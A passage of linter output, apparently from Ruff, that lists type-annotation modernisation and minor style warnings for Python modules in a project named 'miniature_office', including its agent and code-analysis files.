149 |         """Perform a generic action and log it"""
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\agents\agent.py:164:67
    |
162 |     """
163 |
164 |     def __init__(self, manager_id: str, name: str, department_id: Optional[str] = None):
    |                                                                   ^^^^^^^^^^^^^
165 |         super().__init__(manager_id, name, AgentRole.MANAGER, department_id)
166 |         self.managed_agents: List[str] = []
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\agents\agent.py:166:30
    |
164 |     def __init__(self, manager_id: str, name: str, department_id: Optional[str] = None):
165 |         super().__init__(manager_id, name, AgentRole.MANAGER, department_id)
166 |         self.managed_agents: List[str] = []
    |                              ^^^^
167 |
168 |     def add_managed_agent(self, agent: Agent):
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\agents\agent.py:194:12
    |
192 |     target_id: str  # Entity being voted on
193 |     decision_id: str = field(default_factory=lambda: str(uuid.uuid4()))
194 |     votes: List[ConsensusVote] = field(default_factory=list)
    |            ^^^^
195 |     threshold: float = 0.66  # 2/3 majority by default
196 |     outcome: Optional[bool] = None
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\agents\agent.py:196:14
    |
194 |     votes: List[ConsensusVote] = field(default_factory=list)
195 |     threshold: float = 0.66  # 2/3 majority by default
196 |     outcome: Optional[bool] = None
    |              ^^^^^^^^^^^^^^
197 |     override_log: Optional[str] = None  # Nothing silently overrides
198 |     decided_at: Optional[datetime] = None
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\agents\agent.py:197:19
    |
195 |     threshold: float = 0.66  # 2/3 majority by default
196 |     outcome: Optional[bool] = None
197 |     override_log: Optional[str] = None  # Nothing silently overrides
    |                   ^^^^^^^^^^^^^
198 |     decided_at: Optional[datetime] = None
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\agents\agent.py:198:17
    |
196 |     outcome: Optional[bool] = None
197 |     override_log: Optional[str] = None  # Nothing silently overrides
198 |     decided_at: Optional[datetime] = None
    |                 ^^^^^^^^^^^^^^^^^^
199 |
200 |     def add_vote(
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\agents\agent.py:247:26
    |
245 |         )
246 |
247 |     def to_dict(self) -> Dict:
    |                          ^^^^
248 |         return {
249 |             "decision_id": self.decision_id,
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\agents\agent.py:275:25
    |
274 |     def __init__(self):
275 |         self.decisions: Dict[str, ConsensusDecision] = {}
    |                         ^^^^
276 |
277 |     def initiate_consensus(
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\agents\agent.py:311:49
    |
309 |         return outcome
310 |
311 |     def get_decision(self, decision_id: str) -> Optional[ConsensusDecision]:
    |                                                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^
312 |         """Retrieve a consensus decision"""
313 |         return self.decisions.get(decision_id)
    |
help: Convert to `X | None`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> src\app\miniature_office\analysis\ast_analyzer.py:27:1
   |
25 | from enum import Enum
26 | from pathlib import Path
27 | from typing import Any, Dict, List, Optional, Set, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> src\app\miniature_office\analysis\ast_analyzer.py:27:1
   |
25 | from enum import Enum
26 | from pathlib import Path
27 | from typing import Any, Dict, List, Optional, Set, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

UP035 `typing.Set` is deprecated, use `set` instead
  --> src\app\miniature_office\analysis\ast_analyzer.py:27:1
   |
25 | from enum import Enum
26 | from pathlib import Path
27 | from typing import Any, Dict, List, Optional, Set, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

UP035 `typing.Tuple` is deprecated, use `tuple` instead
  --> src\app\miniature_office\analysis\ast_analyzer.py:27:1
   |
25 | from enum import Enum
26 | from pathlib import Path
27 | from typing import Any, Dict, List, Optional, Set, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\analysis\ast_analyzer.py:125:11
    |
124 |     # Structural metadata
125 |     name: Optional[str] = None
    |           ^^^^^^^^^^^^^
126 |     value: Optional[Any] = None
127 |     children: List["ASTNode"] = field(default_factory=list)
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\analysis\ast_analyzer.py:126:12
    |
124 |     # Structural metadata
125 |     name: Optional[str] = None
126 |     value: Optional[Any] = None
    |            ^^^^^^^^^^^^^
127 |     children: List["ASTNode"] = field(default_factory=list)
128 |     parent: Optional["ASTNode"] = None
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\analysis\ast_analyzer.py:127:15
    |
125 |     name: Optional[str] = None
126 |     value: Optional[Any] = None
127 |     children: List["ASTNode"] = field(default_factory=list)
    |               ^^^^
128 |     parent: Optional["ASTNode"] = None
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\analysis\ast_analyzer.py:131:15
    |
130 |     # Semantic metadata
131 |     scope_id: Optional[str] = None
    |               ^^^^^^^^^^^^^
132 |     bindings: Set[str] = field(default_factory=set)
133 |     references: Set[str] = field(default_factory=set)
    |
help: Convert to `X | None`

UP006 [*] Use `set` instead of `Set` for type annotation
   --> src\app\miniature_office\analysis\ast_analyzer.py:132:15
    |
130 |     # Semantic metadata
131 |     scope_id: Optional[str] = None
132 |     bindings: Set[str] = field(default_factory=set)
    |               ^^^
133 |     references: Set[str] = field(default_factory=set)
    |
help: Replace with `set`

UP006 [*] Use `set` instead of `Set` for type annotation
   --> src\app\miniature_office\analysis\ast_analyzer.py:133:17
    |
131 |     scope_id: Optional[str] = None
132 |     bindings: Set[str] = field(default_factory=set)
133 |     references: Set[str] = field(default_factory=set)
    |                 ^^^
134 |
135 |     # Type annotations
    |
help: Replace with `set`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\analysis\ast_analyzer.py:136:22
    |
135 |     # Type annotations
136 |     type_annotation: Optional[str] = None
    |                      ^^^^^^^^^^^^^
137 |     return_annotation: Optional[str] = None
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\analysis\ast_analyzer.py:137:24
    |
135 |     # Type annotations
136 |     type_annotation: Optional[str] = None
137 |     return_annotation: Optional[str] = None
    |                        ^^^^^^^^^^^^^
138 |
139 |     # Function/class specific
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\analysis\ast_analyzer.py:140:17
    |
139 |     # Function/class specific
140 |     decorators: List[str] = field(default_factory=list)
    |                 ^^^^
141 |     arguments: List[Tuple[str, Optional[str]]] = field(
142 |         default_factory=list
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\analysis\ast_analyzer.py:141:16
    |
139 |     # Function/class specific
140 |     decorators: List[str] = field(default_factory=list)
141 |     arguments: List[Tuple[str, Optional[str]]] = field(
    |                ^^^^
142 |         default_factory=list
143 |     )  # (name, type_hint)
    |
help: Replace with `list`

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
   --> src\app\miniature_office\analysis\ast_analyzer.py:141:21
    |
139 |     # Function/class specific
140 |     decorators: List[str] = field(default_factory=list)
141 |     arguments: List[Tuple[str, Optional[str]]] = field(
    |                     ^^^^^
142 |         default_factory=list
143 |     )  # (name, type_hint)
    |
help: Replace with `tuple`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\analysis\ast_analyzer.py:141:32
    |
139 |     # Function/class specific
140 |     decorators: List[str] = field(default_factory=list)
141 |     arguments: List[Tuple[str, Optional[str]]] = field(
    |                                ^^^^^^^^^^^^^
142 |         default_factory=list
143 |     )  # (name, type_hint)
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\analysis\ast_analyzer.py:144:19
    |
142 |         default_factory=list
143 |     )  # (name, type_hint)
144 |     base_classes: List[str] = field(default_factory=list)
    |                   ^^^^
145 |
146 |     # Complexity indicators
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\analysis\ast_analyzer.py:151:15
    |
150 |     # Additional metadata dictionary for extension
151 |     metadata: Dict[str, Any] = field(default_factory=dict)
    |               ^^^^
152 |
153 |     def __repr__(self) -> str:
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\analysis\ast_analyzer.py:225:30
    |
223 |     def __init__(self):
224 |         self._scope_counter = 0
225 |         self._current_scope: Optional[str] = None
    |                              ^^^^^^^^^^^^^
226 |         self._scope_stack: List[str] = []
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\analysis\ast_analyzer.py:226:28
    |
224 |         self._scope_counter = 0
225 |         self._current_scope: Optional[str] = None
226 |         self._scope_stack: List[str] = []
    |                            ^^^^
227 |
228 |     def parse_file(self, filepath: Path) -> Tuple[Optional[ASTNode], Optional[str]]:
    |
help: Replace with `list`

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
   --> src\app\miniature_office\analysis\ast_analyzer.py:228:45
    |
226 |         self._scope_stack: List[str] = []
227 |
228 |     def parse_file(self, filepath: Path) -> Tuple[Optional[ASTNode], Optional[str]]:
    |                                             ^^^^^
229 |         """
230 |         Parse Python file into annotated AST
    |
help: Replace with `tuple`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\analysis\ast_analyzer.py:228:51
    |
226 |         self._scope_stack: List[str] = []
227 |
228 |     def parse_file(self, filepath: Path) -> Tuple[Optional[ASTNode], Optional[str]]:
    |                                                   ^^^^^^^^^^^^^^^^^
229 |         """
230 |         Parse Python file into annotated AST
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\analysis\ast_analyzer.py:228:70
    |
226 |         self._scope_stack: List[str] = []
227 |
228 |     def parse_file(self, filepath: Path) -> Tuple[Optional[ASTNode], Optional[str]]:
    |                                                                      ^^^^^^^^^^^^^
229 |         """
230 |         Parse Python file into annotated AST
    |
help: Convert to `X | None`

UP015 [*] Unnecessary mode argument
   --> src\app\miniature_office\analysis\ast_analyzer.py:247:33
    |
245 |         """
246 |         try:
247 |             with open(filepath, "r", encoding="utf-8") as f:
    |                                 ^^^
248 |                 source = f.read()
249 |             return self.parse_source(source, str(filepath))
    |
help: Remove mode argument

UP015 [*] Unnecessary mode argument
   --> src\app\miniature_office\analysis\ast_analyzer.py:253:37
    |
251 |             # Attempt fallback encoding
252 |             try:
253 |                 with open(filepath, "r", encoding="latin-1") as f:
    |                                     ^^^
254 |                     source = f.read()
255 |                 return self.parse_source(source, str(filepath))
    |
help: Remove mode argument

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
   --> src\app\miniature_office\analysis\ast_analyzer.py:268:10
    |
266 |     def parse_source(
267 |         self, source: str, filename: str = "<string>"
268 |     ) -> Tuple[Optional[ASTNode], Optional[str]]:
    |          ^^^^^
269 |         """
270 |         Parse Python source code into annotated AST
    |
help: Replace with `tuple`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\analysis\ast_analyzer.py:268:16
    |
266 |     def parse_source(
267 |         self, source: str, filename: str = "<string>"
268 |     ) -> Tuple[Optional[ASTNode], Optional[str]]:
    |                ^^^^^^^^^^^^^^^^^
269 |         """
270 |         Parse Python source code into annotated AST
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\analysis\ast_analyzer.py:268:35
    |
266 |     def parse_source(
267 |         self, source: str, filename: str = "<string>"
268 |     ) -> Tuple[Optional[ASTNode], Optional[str]]:
    |                                   ^^^^^^^^^^^^^
269 |         """
270 |         Parse Python source code into annotated AST
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\analysis\ast_analyzer.py:303:54
    |
301 |             return None, f"Parse error: {type(e).__name__}: {e}"
302 |
303 |     def _build_node(self, raw_node: ast.AST, parent: Optional[ASTNode]) -> ASTNode:
    |                                                      ^^^^^^^^^^^^^^^^^
304 |         """
305 |         Build annotated ASTNode from raw ast.AST node
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\analysis\ast_analyzer.py:454:10
    |
452 |     def _extract_arguments(
453 |         self, args: ast.arguments
454 |     ) -> List[Tuple[str, Optional[str]]]:
    |          ^^^^
455 |         """
456 |         Extract function arguments with type hints
    |
help: Replace with `list`

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
   --> src\app\miniature_office\analysis\ast_analyzer.py:454:15
    |
452 |     def _extract_arguments(
453 |         self, args: ast.arguments
454 |     ) -> List[Tuple[str, Optional[str]]]:
    |               ^^^^^
455 |         """
456 |         Extract function arguments with type hints
    |
help: Replace with `tuple`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\analysis\ast_analyzer.py:454:26
    |
452 |     def _extract_arguments(
453 |         self, args: ast.arguments
454 |     ) -> List[Tuple[str, Optional[str]]]:
    |                          ^^^^^^^^^^^^^
455 |         """
456 |         Extract function arguments with type hints
    |
help: Convert to `X | None`

B007 Loop control variable `i` not used within loop body
   --> src\app\miniature_office\analysis\ast_analyzer.py:463:13
    |
462 |         # Regular arguments
463 |         for i, arg in enumerate(args.args):
    |             ^
464 |             annotation = None
465 |             if arg.annotation:
    |
help: Rename unused `i` to `_i`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\analysis\ast_analyzer.py:590:51
    |
588 |         visit(root)
589 |
590 |     def extract_functions(self, root: ASTNode) -> List[ASTNode]:
    |                                                   ^^^^
591 |         """Extract all function definitions from AST"""
592 |         functions = []
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\analysis\ast_analyzer.py:606:49
    |
604 |         return functions
605 |
606 |     def extract_classes(self, root: ASTNode) -> List[ASTNode]:
    |                                                 ^^^^
607 |         """Extract all class definitions from AST"""
608 |         classes = []
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\analysis\ast_analyzer.py:619:49
    |
617 |         return classes
618 |
619 |     def extract_imports(self, root: ASTNode) -> List[ASTNode]:
    |                                                 ^^^^
620 |         """Extract all import statements from AST"""
621 |         imports = []
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\analysis\ast_analyzer.py:632:49
    |
630 |         return imports
631 |
632 |     def generate_report(self, root: ASTNode) -> Dict[str, Any]:
    |                                                 ^^^^
633 |         """
634 |         Generate comprehensive analysis report
    |
help: Replace with `dict`

C413 [*] Unnecessary `list()` call around `sorted()`
   --> src\app\miniature_office\analysis\ast_analyzer.py:705:35
    |
703 |             "total_bindings": len(total_bindings),
704 |             "total_references": len(total_references),
705 |             "unique_names_bound": list(sorted(total_bindings)),
    |                                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
706 |             "unique_names_referenced": list(sorted(total_references)),
707 |         }
    |
help: Remove unnecessary `list()` call

C413 [*] Unnecessary `list()` call around `sorted()`
   --> src\app\miniature_office\analysis\ast_analyzer.py:706:40
    |
704 |             "total_references": len(total_references),
705 |             "unique_names_bound": list(sorted(total_bindings)),
706 |             "unique_names_referenced": list(sorted(total_references)),
    |                                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
707 |         }
    |
help: Remove unnecessary `list()` call

UP035 `typing.List` is deprecated, use `list` instead
 --> src\app\miniature_office\analysis\dependency_analyzer.py:5:1
  |
3 | from dataclasses import dataclass, field
4 | from enum import Enum
5 | from typing import List, Set
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP035 `typing.Set` is deprecated, use `set` instead
 --> src\app\miniature_office\analysis\dependency_analyzer.py:5:1
  |
3 | from dataclasses import dataclass, field
4 | from enum import Enum
5 | from typing import List, Set
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP006 [*] Use `set` instead of `Set` for type annotation
  --> src\app\miniature_office\analysis\dependency_analyzer.py:29:12
   |
27 |     """Complete dependency graph"""
28 |
29 |     nodes: Set[str] = field(default_factory=set)
   |            ^^^
30 |     edges: List[ModuleRelation] = field(default_factory=list)
   |
help: Replace with `set`

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\analysis\dependency_analyzer.py:30:12
   |
29 |     nodes: Set[str] = field(default_factory=set)
30 |     edges: List[ModuleRelation] = field(default_factory=list)
   |            ^^^^
31 |
32 |     def detect_cycles(self) -> List[List[str]]:
   |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\analysis\dependency_analyzer.py:32:32
   |
30 |     edges: List[ModuleRelation] = field(default_factory=list)
31 |
32 |     def detect_cycles(self) -> List[List[str]]:
   |                                ^^^^
33 |         """Detect circular dependencies"""
34 |         return []
   |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\analysis\dependency_analyzer.py:32:37
   |
30 |     edges: List[ModuleRelation] = field(default_factory=list)
31 |
32 |     def detect_cycles(self) -> List[List[str]]:
   |                                     ^^^^
33 |         """Detect circular dependencies"""
34 |         return []
   |
help: Replace with `list`

UP006 [*] Use `set` instead of `Set` for type annotation
  --> src\app\miniature_office\analysis\dependency_analyzer.py:36:59
   |
34 |         return []
35 |
36 |     def get_transitive_dependencies(self, module: str) -> Set[str]:
   |                                                           ^^^
37 |         """Get all transitive dependencies of a module"""
38 |         return set()
   |
help: Replace with `set`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> src\app\miniature_office\analysis\design_analyzer.py:33:1
   |
31 | from dataclasses import dataclass, field
32 | from enum import Enum
33 | from typing import Any, Dict, List, Optional, Set, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
34 |
35 | # ============================================================================
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> src\app\miniature_office\analysis\design_analyzer.py:33:1
   |
31 | from dataclasses import dataclass, field
32 | from enum import Enum
33 | from typing import Any, Dict, List, Optional, Set, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
34 |
35 | # ============================================================================
   |

UP035 `typing.Set` is deprecated, use `set` instead
  --> src\app\miniature_office\analysis\design_analyzer.py:33:1
   |
31 | from dataclasses import dataclass, field
32 | from enum import Enum
33 | from typing import Any, Dict, List, Optional, Set, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
34 |
35 | # ============================================================================
   |

UP035 `typing.Tuple` is deprecated, use `tuple` instead
  --> src\app\miniature_office\analysis\design_analyzer.py:33:1
   |
31 | from dataclasses import dataclass, field
32 | from enum import Enum
33 | from typing import Any, Dict, List, Optional, Set, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
34 |
35 | # ============================================================================
   |

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\analysis\design_analyzer.py:199:19
    |
197 |     pattern: DesignPattern
198 |     confidence: float  # 0.0 to 1.0
199 |     participants: Dict[str, str]  # role -> class/function name
    |                   ^^^^
200 |     location: Tuple[int, int]  # (line_start, line_end)
201 |     quality_score: float  # How well implemented (0.0-1.0)
    |
help: Replace with `dict`

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
   --> src\app\miniature_office\analysis\design_analyzer.py:200:15
    |
198 |     confidence: float  # 0.0 to 1.0
199 |     participants: Dict[str, str]  # role -> class/function name
200 |     location: Tuple[int, int]  # (line_start, line_end)
    |               ^^^^^
201 |     quality_score: float  # How well implemented (0.0-1.0)
202 |     violations: List[str] = field(default_factory=list)
    |
help: Replace with `tuple`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\analysis\design_analyzer.py:202:17
    |
200 |     location: Tuple[int, int]  # (line_start, line_end)
201 |     quality_score: float  # How well implemented (0.0-1.0)
202 |     violations: List[str] = field(default_factory=list)
    |                 ^^^^
203 |     context: str = ""
204 |     evidence: List[str] = field(default_factory=list)
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\analysis\design_analyzer.py:204:15
    |
202 |     violations: List[str] = field(default_factory=list)
203 |     context: str = ""
204 |     evidence: List[str] = field(default_factory=list)
    |               ^^^^
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\analysis\design_analyzer.py:223:23
    |
221 |     name: str
222 |     component_type: ComponentType
223 |     responsibilities: List[str] = field(default_factory=list)
    |                       ^^^^
224 |     dependencies: Set[str] = field(default_factory=set)
225 |     dependents: Set[str] = field(default_factory=set)
    |
help: Replace with `list`

UP006 [*] Use `set` instead of `Set` for type annotation
   --> src\app\miniature_office\analysis\design_analyzer.py:224:19
    |
222 |     component_type: ComponentType
223 |     responsibilities: List[str] = field(default_factory=list)
224 |     dependencies: Set[str] = field(default_factory=set)
    |                   ^^^
225 |     dependents: Set[str] = field(default_factory=set)
226 |     provided_interfaces: List[str] = field(default_factory=list)
    |
help: Replace with `set`

UP006 [*] Use `set` instead of `Set` for type annotation
   --> src\app\miniature_office\analysis\design_analyzer.py:225:17
    |
223 |     responsibilities: List[str] = field(default_factory=list)
224 |     dependencies: Set[str] = field(default_factory=set)
225 |     dependents: Set[str] = field(default_factory=set)
    |                 ^^^
226 |     provided_interfaces: List[str] = field(default_factory=list)
227 |     required_interfaces: List[str] = field(default_factory=list)
    |
help: Replace with `set`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\analysis\design_analyzer.py:226:26
    |
224 |     dependencies: Set[str] = field(default_factory=set)
225 |     dependents: Set[str] = field(default_factory=set)
226 |     provided_interfaces: List[str] = field(default_factory=list)
    |                          ^^^^
227 |     required_interfaces: List[str] = field(default_factory=list)
228 |     cohesion_score: float = 0.0  # 0.0 to 1.0
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\analysis\design_analyzer.py:227:26
    |
225 |     dependents: Set[str] = field(default_factory=set)
226 |     provided_interfaces: List[str] = field(default_factory=list)
227 |     required_interfaces: List[str] = field(default_factory=list)
    |                          ^^^^
228 |     cohesion_score: float = 0.0  # 0.0 to 1.0
229 |     coupling_count: int = 0
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\analysis\design_analyzer.py:232:21
    |
230 |     complexity: int = 0
231 |     lines_of_code: int = 0
232 |     public_methods: List[str] = field(default_factory=list)
    |                     ^^^^
233 |     violations: List[str] = field(default_factory=list)
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\analysis\design_analyzer.py:233:17
    |
231 |     lines_of_code: int = 0
232 |     public_methods: List[str] = field(default_factory=list)
233 |     violations: List[str] = field(default_factory=list)
    |                 ^^^^
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\analysis\design_analyzer.py:253:23
    |
251 |     interaction_type: InteractionType
252 |     protocol: str = ""
253 |     data_transferred: List[str] = field(default_factory=list)
    |                       ^^^^
254 |     frequency: str = "unknown"  # "high", "medium", "low", "unknown"
255 |     is_synchronous: bool = True
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\analysis\design_analyzer.py:257:20
    |
255 |     is_synchronous: bool = True
256 |     can_fail: bool = True
257 |     failure_modes: List[str] = field(default_factory=list)
    |                    ^^^^
258 |     recovery_strategy: Optional[str] = None
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\analysis\design_analyzer.py:258:24
    |
256 |     can_fail: bool = True
257 |     failure_modes: List[str] = field(default_factory=list)
258 |     recovery_strategy: Optional[str] = None
    |                        ^^^^^^^^^^^^^
    |
help: Convert to `X | None`

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
   --> src\app\miniature_office\analysis\design_analyzer.py:277:15
    |
275 |     principle: SOLIDPrinciple
276 |     severity: str  # "critical", "major", "minor"
277 |     location: Tuple[int, int]
    |               ^^^^^
278 |     component: str
279 |     description: str
    |
help: Replace with `tuple`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\analysis\design_analyzer.py:332:29
    |
330 |     optional_methods: int
331 |     required_methods: int
332 |     abstraction_violations: List[str] = field(default_factory=list)
    |                             ^^^^
333 |     missing_contracts: List[str] = field(default_factory=list)
334 |     boundary_leaks: List[str] = field(default_factory=list)
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\analysis\design_analyzer.py:333:24
    |
331 |     required_methods: int
332 |     abstraction_violations: List[str] = field(default_factory=list)
333 |     missing_contracts: List[str] = field(default_factory=list)
    |                        ^^^^
334 |     boundary_leaks: List[str] = field(default_factory=list)
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\analysis\design_analyzer.py:334:21
    |
332 |     abstraction_violations: List[str] = field(default_factory=list)
333 |     missing_contracts: List[str] = field(default_factory=list)
334 |     boundary_leaks: List[str] = field(default_factory=list)
    |                     ^^^^
    |
help: Replace with `list`

UP006 [*] Use `set` instead of `Set` for type annotation
   --> src\app\miniature_office\analysis\design_analyzer.py:352:17
    |
350 |     name: str
351 |     level: int  # 0 = lowest (data), increasing upward
352 |     components: Set[str] = field(default_factory=set)
    |                 ^^^
353 |     responsibilities: List[str] = field(default_factory=list)
354 |     depends_on_layers: Set[str] = field(default_factory=set)
    |
help: Replace with `set`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\analysis\design_analyzer.py:353:23
    |
351 |     level: int  # 0 = lowest (data), increasing upward
352 |     components: Set[str] = field(default_factory=set)
353 |     responsibilities: List[str] = field(default_factory=list)
    |                       ^^^^
354 |     depends_on_layers: Set[str] = field(default_factory=set)
355 |     violated_dependencies: List[str] = field(default_factory=list)
    |
help: Replace with `list`

UP006 [*] Use `set` instead of `Set` for type annotation
   --> src\app\miniature_office\analysis\design_analyzer.py:354:24
    |
352 |     components: Set[str] = field(default_factory=set)
353 |     responsibilities: List[str] = field(default_factory=list)
354 |     depends_on_layers: Set[str] = field(default_factory=set)
    |                        ^^^
355 |     violated_dependencies: List[str] = field(default_factory=list)
    |
help: Replace with `set`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\analysis\design_analyzer.py:355:28
    |
353 |     responsibilities: List[str] = field(default_factory=list)
354 |     depends_on_layers: Set[str] = field(default_factory=set)
355 |     violated_dependencies: List[str] = field(default_factory=list)
    |                            ^^^^
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\analysis\design_analyzer.py:373:28
    |
371 |     description: str
372 |     scope: str  # Component or system
373 |     enforcement_mechanism: Optional[str] = None
    |                            ^^^^^^^^^^^^^
374 |     violation_consequence: Optional[str] = None
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\analysis\design_analyzer.py:374:28
    |
372 |     scope: str  # Component or system
373 |     enforcement_mechanism: Optional[str] = None
374 |     violation_consequence: Optional[str] = None
    |                            ^^^^^^^^^^^^^
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\analysis\design_analyzer.py:396:16
    |
394 |     probability: str  # "high", "medium", "low"
395 |     impact: str  # "critical", "major", "minor"
396 |     detection: Optional[str] = None
    |                ^^^^^^^^^^^^^
397 |     recovery_path: Optional[str] = None
398 |     mitigation: Optional[str] = None
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\analysis\design_analyzer.py:397:20
    |
395 |     impact: str  # "critical", "major", "minor"
396 |     detection: Optional[str] = None
397 |     recovery_path: Optional[str] = None
    |                    ^^^^^^^^^^^^^
398 |     mitigation: Optional[str] = None
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\analysis\design_analyzer.py:398:17
    |
396 |     detection: Optional[str] = None
397 |     recovery_path: Optional[str] = None
398 |     mitigation: Optional[str] = None
    |                 ^^^^^^^^^^^^^
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\analysis\design_analyzer.py:423:24
    |
422 |     # Pattern Detection (complete)
423 |     detected_patterns: List[PatternInstance] = field(default_factory=list)
    |                        ^^^^
424 |
425 |     # Architectural Structure (complete)
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\analysis\design_analyzer.py:427:17
    |
425 |     # Architectural Structure (complete)
426 |     architectural_style: ArchitecturalStyle = ArchitecturalStyle.UNKNOWN
427 |     components: Dict[str, ArchitecturalComponent] = field(default_factory=dict)
    |                 ^^^^
428 |     interactions: List[ComponentInteraction] = field(default_factory=list)
